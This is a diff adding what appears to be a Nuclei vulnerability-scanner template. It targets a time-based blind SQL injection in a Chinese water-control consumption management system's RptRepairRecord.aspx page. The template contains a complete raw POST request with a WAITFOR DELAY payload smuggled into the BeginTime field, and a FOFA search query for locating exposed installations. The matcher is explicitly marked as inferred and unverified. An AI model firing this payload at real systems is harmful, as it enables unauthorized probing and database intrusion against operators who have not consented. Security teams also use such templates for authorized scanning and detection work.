@@ -1,0 +1,37 @@
+id: poc-dscc4zmmgzumfu73
+info:
+  name: 水控消费后台管理系统RptRepairRecord存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dscc4zmmgzumfu73
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dscc4zmmgzumfu73
+    fofa: body="登陆页" && body="水控消费后台管理系统"
+http:
+- raw:
+  - 'POST /HardwareRpt/RptRepairRecord.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    __EVENTTARGET=BtnSearch&__EVENTARGUMENT=&__VIEWSTATE=qZcAle3YgJRy2T5rZeVP7M7PvulTO7Rq3cxPUIpBMpqbyhOOFMR2hpmKu9KdEOc8KDtdjnC2R172YM6HHwjiSKQAU0FB9AibYi060WodEyt6FnUaUDklgpD%2B%2BDXfnUdIUx7347%2BN%2B6HphZrzMrEEsC103I2biNvtv5754Wv%2B5Oh08BPErM%2BBn14VMA6OJESPcm0RutQUfqGPymD7UvkcHRVPV4UPl0iZBvsPckKDkT185Dl%2Fqjhg5slFEZOglZB0NmD1C295ojTozSaNpC2rWXdpQbl7TZ6aGzxsbYr2FV7Z%2BUkmMs4JkyPhLpzZ8eenfgHosyoI1Z9woAH7OS0YE0%2BaPDUy8Ls64gy%2FQ3UKfrdzxn4QTCOqDNEV%2BhE8hzmCHSQ5R83yRakMw9tEZ3k%2F1Q%3D%3D&__VIEWSTATEGENERATOR=66131512&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=WLbAR4m592bcpUKrhqU4GlZZFVs343w2jxu8g6Y7f2pm%2FVQ68TKklxEBJFjdXCbdwaojClsgfUfQPVMWZZkiqQNPhmIRNscioCVqoCSgT3EWkf0OCTnN6li9SKxALjOTErJgxS%2B0zHoTsH9aNEQOV4%2BJ03FZs4PNb4bGRbYCnB9dRw2JN7PjQ0pAuz5I5b1tF9I1Vyhp7KcYLffxmTctaA%3D%3D&DropSchool=&DropType=3&BeginTime=2025-04-24'';WAITFOR DELAY ''0:0:5''--&EndTime=2025-04-24'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
